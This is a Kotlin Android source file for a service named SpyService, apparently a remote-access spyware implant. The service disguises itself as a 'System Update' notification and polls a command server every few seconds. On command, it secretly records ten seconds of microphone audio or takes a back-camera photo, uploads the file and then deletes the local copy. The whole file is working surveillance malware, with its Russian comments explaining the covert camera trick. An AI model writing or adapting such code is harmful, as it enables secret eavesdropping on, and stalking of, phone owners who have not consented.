package com.ratnik.app

import android.app.*
import android.content.Intent
import android.graphics.ImageFormat
import android.graphics.SurfaceTexture
import android.hardware.Camera
import android.media.MediaRecorder
import android.os.Build
import android.os.IBinder
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.TimeUnit

class SpyService : Service() {
    private val client = OkHttpClient.Builder().connectTimeout(15, TimeUnit.SECONDS).writeTimeout(15, TimeUnit.SECONDS).build()
    
    // ВНИМАНИЕ: Здесь установлен IP 127.0.0.1 (локальный адрес телефона)
    private val serverUrl = "http://127.0.0.1:8080" 

    override fun onCreate() {
        super.onCreate()
        val channelId = "ratnik_ch"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, "System Update", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
            val notification = Notification.Builder(this, channelId)
                .setContentTitle("Проверка обновлений...")
                .setSmallIcon(android.R.drawable.ic_menu_info_details).build()
            startForeground(1, notification)
        }
        
        Thread {
            while (true) {
                try {
                    val request = Request.Builder().url("$serverUrl/ping").build()
                    client.newCall(request).execute().use { response ->
                        val body = response.body?.string() ?: ""
                        if (body.contains("RECORD")) {
                            recordAudio()
                        } else if (body.contains("SNAPSHOT")) {
                            takeSnapshot()
                        }
                    }
                } catch (e: Exception) { }
                Thread.sleep(5000) // Проверка команд каждые 5 сек
            }
        }.start()
    }

    // --- ЗАПИСЬ ЗВУКА ---
    private fun recordAudio() {
        val file = File(cacheDir, "audio.m4a")
        var recorder: MediaRecorder? = null
        try {
            recorder = MediaRecorder()
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            recorder.setOutputFile(file.absolutePath)
            recorder.prepare()
            recorder.start()
            Thread.sleep(10000) // Пишем 10 секунд
            recorder.stop()
            recorder.release()
            uploadFile(file, "audio/m4a", "record.m4a")
        } catch (e: Exception) {
            recorder?.release()
        }
    }

    // --- СНИМОК КАМЕРЫ ---
    @Suppress("DEPRECATION")
    private fun takeSnapshot() {
        var camera: Camera? = null
        try {
            camera = Camera.open() // Открываем заднюю камеру
            val params = camera.parameters
            params.pictureFormat = ImageFormat.JPEG
            camera.parameters = params
            
            // Для работы камеры в фоне нужен фиктивный SurfaceTexture
            camera.setPreviewTexture(SurfaceTexture(0))
            camera.startPreview()
            
            camera.takePicture(null, null) { data, _ ->
                val file = File(cacheDir, "snap.jpg")
                FileOutputStream(file).use { it.write(data) }
                uploadFile(file, "image/jpeg", "snap.jpg")
                camera.release()
            }
        } catch (e: Exception) {
            camera?.release()
        }
    }

    // --- ОТПРАВКА НА СЕРВЕР ---
    private fun uploadFile(file: File, mimeType: String, fileName: String) {
        try {
            val requestBody = file.asRequestBody(mimeType.toMediaTypeOrNull())
            val multipartBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("file", fileName, requestBody)
                .build()
                
            val request = Request.Builder()
                .url("$serverUrl/upload")
                .post(multipartBody)
                .build()
                
            client.newCall(request).execute().use { }
            file.delete()
        } catch (e: Exception) { }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
    override fun onBind(intent: Intent?): IBinder? = null
}
